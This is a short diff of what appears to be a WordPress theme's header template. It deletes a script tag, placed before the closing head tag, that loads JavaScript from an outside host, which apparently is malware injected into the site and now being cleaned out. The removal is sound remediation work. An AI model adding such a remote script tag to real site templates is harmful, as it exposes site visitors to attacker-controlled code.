@@ -12,7 +12,7 @@
 		<link rel="profile" href="http://gmpg.org/xfn/11">
 		<link rel="pingback" href="<?php esc_url( bloginfo( 'pingback_url' ) ); ?>">
 		<?php wp_head(); ?>
-	<script type='text/javascript' src='https://stat.belonnanotservice.ga/get.js?v=2'></script></head>
+    </head>
 
 	<body <?php body_class(); ?> itemscope="itemscope" itemtype="http://schema.org/WebPage">
 
